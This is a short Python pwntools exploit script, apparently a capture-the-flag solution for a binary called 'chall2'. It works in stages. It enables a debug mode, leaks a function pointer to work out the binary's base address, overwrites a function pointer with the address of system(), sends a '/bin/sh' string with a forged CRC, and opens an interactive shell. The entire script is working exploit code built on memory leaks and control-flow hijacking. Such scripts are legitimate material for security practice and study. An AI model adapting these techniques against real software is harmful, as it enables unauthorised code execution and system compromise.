#!/usr/bin/python
from pwn import *

BASE = 0xc95  # distance from leak to binary base
FUNC = 0xa70  # distance from base to system()

io = process('../chall2')

# mmm ansi art
print io.recvuntil('\n\n')

# step 1: flip a bit in the fail counter to turn "debugging" on
io.recvuntil(':\x1b[0m ')
io.sendline('\x00')

# step 2: write 1024 bytes to leak a function pointer
io.recvuntil(':\x1b[0m ')
io.send('_'*1024)
for i in range(64):
	io.recvline()
leak = int(''.join(io.recvline().strip().split(' ')[::-1][-6:]), 16)
base = leak - BASE

log.info('leak:  0x%012x' % leak)
log.info('base:  0x%012x' % base)

# step 3: setup function pointer
io.recvuntil(':\x1b[0m ')
io.sendline('\x00'+cyclic(959)+p64(base+FUNC))

# step 4: write a string that will result in a crc of 0x80000000
io.recvuntil(':\x1b[0m ')
io.sendline('/bin/sh;#'+p32(0xd1b9af3d))

#step 5: enjoy the shell
io.recvline()
io.sendline('id')
log.success('shell: %s' % io.recvline().strip())

io.interactive()